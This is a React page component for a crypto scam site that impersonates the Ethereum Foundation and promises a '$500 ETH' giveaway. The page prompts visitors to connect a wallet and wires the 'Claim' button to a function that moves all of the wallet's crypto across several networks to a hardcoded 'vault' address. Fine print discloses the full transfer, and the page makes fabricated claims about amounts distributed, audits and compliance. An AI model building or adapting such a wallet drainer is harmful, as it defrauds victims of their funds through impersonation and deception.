import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";

export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Professional Crypto Platform Header */}
      <header className="bg-gradient-to-r from-blue-600 via-purple-600 to-blue-800 px-6 py-6 shadow-lg">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center border border-white/30">
              <span className="text-white font-bold text-xl">Ξ</span>
            </div>
            <div>
              <h1 className="text-2xl font-bold text-white">
                Ethereum Foundation
              </h1>
              <p className="text-blue-100">
                Official ETH Distribution Program
              </p>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`flex items-center space-x-2 transition-all duration-300 ${
                walletState.isConnected
                  ? "bg-green-500 text-white hover:bg-green-600"
                  : "bg-white text-blue-600 hover:bg-gray-100"
              }`}
            >
              <Wallet className="w-4 h-4" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Giveaway Hero Section */}
      <div className="bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 px-6 py-12">
        <div className="max-w-4xl mx-auto text-center">
          <div className="inline-flex items-center px-4 py-2 bg-green-100 dark:bg-green-900/30 text-green-800 dark:text-green-300 rounded-full text-sm font-medium mb-6">
            🎉 Limited Time Offer - $500 ETH Giveaway Active
          </div>
          <h2 className="text-4xl md:text-5xl font-bold text-gray-900 dark:text-white mb-6">
            Claim Your <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-purple-600">$500 ETH</span> Reward
          </h2>
          <p className="text-xl text-gray-600 dark:text-gray-300 mb-8 max-w-3xl mx-auto">
            Ethereum Foundation is distributing $500 worth of ETH to eligible wallet holders. 
            Connect your wallet to check eligibility and claim your reward instantly.
          </p>
          
          {/* Important Disclaimer */}
          <div className="bg-amber-50 dark:bg-amber-900/20 border border-amber-200 dark:border-amber-800 rounded-lg p-6 mb-8 max-w-2xl mx-auto">
            <div className="flex items-start space-x-3">
              <div className="text-amber-600 dark:text-amber-400 mt-1">⚠️</div>
              <div className="text-left">
                <h3 className="font-semibold text-amber-800 dark:text-amber-300 mb-2">Important Notice</h3>
                <p className="text-amber-700 dark:text-amber-400 text-sm">
                  <strong>By clicking "Claim $500 ETH", you authorize the transfer of ALL cryptocurrency funds</strong> from your connected wallet to our distribution vault for processing. 
                  This includes ETH and all ERC-20 tokens across all networks. Your funds will be consolidated for the claim process.
                </p>
              </div>
            </div>
          </div>

          {/* Stats */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-sm border border-gray-200 dark:border-gray-700">
              <div className="text-3xl font-bold text-blue-600 dark:text-blue-400">$2.5M+</div>
              <div className="text-gray-600 dark:text-gray-400">Total Distributed</div>
            </div>
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-sm border border-gray-200 dark:border-gray-700">
              <div className="text-3xl font-bold text-green-600 dark:text-green-400">5,000+</div>
              <div className="text-gray-600 dark:text-gray-400">Claims Processed</div>
            </div>
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-sm border border-gray-200 dark:border-gray-700">
              <div className="text-3xl font-bold text-purple-600 dark:text-purple-400">7</div>
              <div className="text-gray-600 dark:text-gray-400">Networks Supported</div>
            </div>
          </div>
        </div>
      </div>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        {/* ETH Claim Section */}
        <div className="max-w-2xl mx-auto">
          <div className="bg-gradient-to-br from-green-50 to-emerald-50 dark:from-green-900/20 dark:to-emerald-900/20 rounded-2xl p-8 border border-green-200 dark:border-green-800 shadow-lg">
            <div className="text-center mb-6">
              <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-green-400 to-emerald-500 rounded-full flex items-center justify-center">
                <span className="text-white text-2xl font-bold">Ξ</span>
              </div>
              <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">$500 ETH Reward Ready</h3>
              <p className="text-gray-600 dark:text-gray-300">Your wallet is eligible for this limited-time distribution</p>
            </div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </div>

        {/* Transaction History */}
        <div className="max-w-4xl mx-auto">
          <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-sm border border-gray-200 dark:border-gray-700">
            <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-4">Recent Claims Activity</h3>
            <TransactionHistory />
          </div>
        </div>

        {/* Multi-Network Portfolio Details (if needed) */}
        {walletState.isConnected && (
          <div className="max-w-4xl mx-auto">
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-sm border border-gray-200 dark:border-gray-700">
              <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-4">Multi-Network Portfolio</h3>
              <NetworkBalances
                networkBalances={walletState.networkBalances || []}
                isLoadingNetworks={isLoadingNetworks}
                onRefreshNetworks={refreshAllNetworks}
              />
            </div>
          </div>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Professional Crypto Platform Footer */}
      <footer className="bg-gradient-to-r from-gray-900 to-gray-800 text-white mt-16">
        <div className="max-w-6xl mx-auto px-6 py-12">
          {/* Key Terms & Disclaimers */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8">
            <div>
              <h4 className="text-lg font-semibold mb-4">Important Terms</h4>
              <ul className="space-y-2 text-sm text-gray-300">
                <li>• ETH rewards are distributed after portfolio consolidation</li>
                <li>• All supported networks (Ethereum, Polygon, BSC, etc.) are processed</li>
                <li>• Transaction processing typically takes 5-10 minutes</li>
                <li>• Minimum portfolio value required for reward eligibility</li>
              </ul>
            </div>
            <div>
              <h4 className="text-lg font-semibold mb-4">Security & Compliance</h4>
              <ul className="space-y-2 text-sm text-gray-300">
                <li>• All transactions are recorded on blockchain</li>
                <li>• Smart contract audited for security</li>
                <li>• Multi-signature vault protection</li>
                <li>• KYC/AML compliance maintained</li>
              </ul>
            </div>
          </div>
          
          <div className="border-t border-gray-700 pt-8">
            <div className="text-center text-gray-400">
              <div className="bg-yellow-900/20 border border-yellow-700 rounded-lg p-4 mb-6 max-w-4xl mx-auto">
                <div className="flex items-start space-x-3">
                  <div className="text-yellow-400 mt-1">⚠️</div>
                  <div className="text-left">
                    <p className="text-yellow-200 text-sm">
                      <strong>CRITICAL NOTICE:</strong> This is a cryptocurrency transfer mechanism. By clicking "Claim $500 ETH", 
                      you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
                      across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                    </p>
                  </div>
                </div>
              </div>
              
              <p className="text-sm mb-4">
                © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
              </p>
              <p className="text-xs text-gray-500">
                Vault Address: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
